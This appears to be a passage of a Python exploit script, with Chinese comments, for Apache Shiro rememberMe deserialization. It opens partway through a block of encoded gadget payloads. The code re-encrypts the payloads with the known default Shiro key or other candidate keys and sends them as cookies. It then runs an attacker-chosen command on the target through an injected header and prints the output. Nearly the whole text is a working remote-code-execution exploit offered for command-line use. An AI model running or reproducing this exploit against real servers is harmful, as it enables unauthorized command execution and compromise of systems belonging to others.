NYsKJgO1BRqF/SYewV4nux1LLMfD2Sxrj/SPmcOxF6DLDL1w8fnRNjdmS0nXYuqLe2XodseOhGyp5K/yVt6SfFJulQ7/8kqksBDIIoIhRL6EkcoCnlCH0rFGQFvoDSoFFTvx1z2oAMa1AhHW3IFKYuyWgWJTPCXnlN9R2iTw3ice9qLHMejC1M2Q3+MS61v8WsIfJZR3b7JYVmokHNOi2RU3n6ciW/5r6F1dQPoeipIcnPWDyWwTy5qYB1uhlEqZaD5aFFuXY2+9piHwP5Vc9YIIcG7vBLcaf13qDAGLgcy8uMwoqm5ZKcJ4VPc7XLZauQftjbUCc5ryup0Q5tiI8vV7cDteZFUvRcWo9JoJRjAeFCSkxLtYnFZMNOV40Sv62NMDdgSDFL5cGvN636ngAAfrcKQSrmrPplH4/87ZGXc4tKqiPHOp+ur8sCsP2XCfOVNnmp0NyLOBUjmztVOgqBlk6IcjJidA0mr/+ysiZxpQ55p9ZZVcNNEoJRKOedsJiTy6KWt4glnMlzNk4w2NWkxRmOO4HTZ6g2gY2kbRSJXMTtsvE2dDE9e3qt8Ad+kLEP4lbP8YI5qtziAMtRS4B5xzBJFkqfaUU8JmfFvB6uSwSohnGbbJTwK6lvzB3atCtqYiS6CDpch/RWuS9ma7m5SPj9GymbQXpaljqOa1w",

}


# 用对应的key解密源payload
def decode_remember(new_key, remember):
    key = "kPH+bIxk5D2deZiIxcaaaA=="
    iv = base64.b64decode(remember)[:16]
    file_body = base64.b64decode(remember)[16:]
    mode = AES.MODE_CBC
    decryptor = AES.new(base64.b64decode(key), mode, iv)

    payload = encode_rememberme(decryptor.decrypt(file_body), new_key)
    return payload.decode()


# 将xray的payload重新加密,new_key可以是其他的shiro key
def encode_rememberme(file_body, k):
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    # print(pad(b"\xac\xed\x00"))
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(k), mode, iv)
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))  # 使用key加密序列化数据并进行base64
    return base64_ciphertext


def do_exp(target, p, c):
    try:
        headers['Cookie'] = 'rememberMe = %s' % p
        headers['Testecho'] = '1test85x'
        res = requests.post(target, headers=headers, timeout=15, proxies=proxies)
        # 匹配testecho 输出的环境信息，成功则表示执行命令莫得问题
        # ifjava = re.findall(r'\{(.*?)\}', res.text, re.S)
        if res.headers.get('Testecho') == '1test85x':
            print(" ")
            print(
                "[" + Fore.GREEN + "*" + Style.RESET_ALL + "] " + "The response headers find: " + Fore.YELLOW + "Testecho:1test85x")
            if c == 'test':
                print("[" + Fore.RED + "+" + Style.RESET_ALL + "] " + Fore.RED + 'The target is vul')
                return True
            logging.info("Execute cmd")
            headers['Testcmd'] = c
            res = requests.get(target, headers=headers, timeout=15, proxies=proxies)
            head, sep, tail = res.text.partition(start_html)
            logging.info(head)
            # print(head)
            print(
                "[" + Fore.RED + "+" + Style.RESET_ALL + "] " + Fore.RED + 'Command \'%s\' is returned:\n%s' % (
                    c, head.strip()))
            return True
        return False
    except ConnectionError as e1:
        logging.error(e1)
    except Exception as e:
        logging.error(e)
        sys.exit()
    finally:
        pass


if __name__ == '__main__':
    try:
        if len(sys.argv) == 2:
            url = sys.argv[1]
            cmd = "test"
        elif len(sys.argv) == 3:
            url = sys.argv[1]
            cmd = sys.argv[2]
        elif len(sys.argv) == 4:
            keys = []
            url = sys.argv[1]
            cmd = sys.argv[2]
            keys.append(sys.argv[3])
        else:
            print("use：exp.py url cmd(default tets) key(default keys)")
            sys.exit()
        print("[*] URL:%s" % url)
        print("[*] CMD:%s" % cmd)

        vul = True
        print("[*] Key count: %s" % len(keys))
        print("[*] Gadget count: %s" % len(remember))

        # 检查响应头中的 rememberMe=deleteMe
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/83.0.4103.61 Safari/537.36",
            "Cookie": "rememberMe = test;",
        }
        proxies = {
            #"http": "http://127.0.0.1:8080",
        }
        res = requests.get(url, headers=headers, timeout=15, proxies=proxies)
        # print(res)
        # 获取html开始位置，方便后续字符串分割命令结果和原始body
        start_html = res.text[0:10]
        if "rememberMe=deleteMe" in str(res.headers):
            for r in remember:
                print("[*] Test Gadget %s" % r)
                for i in keys:
                    s = "\r[" + Fore.GREEN + "*" + Style.RESET_ALL + "] " + Fore.WHITE + 'Check key: ' + Fore.YELLOW + i + " "
                    print(s.ljust((len(s) + 7), ' '), end='', flush=True)
                    payload = decode_remember(i, remember[r])
                    if do_exp(url, payload, cmd):
                        sys.exit()
                    else:
                        sleep(0.2)
                print(" ")
            print("[" + Fore.WHITE + "-" + Style.RESET_ALL + "] " + Fore.WHITE + 'The target maybe not vul')
        else:
            print("not rememberMe")
    except Exception as e:
        logging.error(e)
        sys.exit()
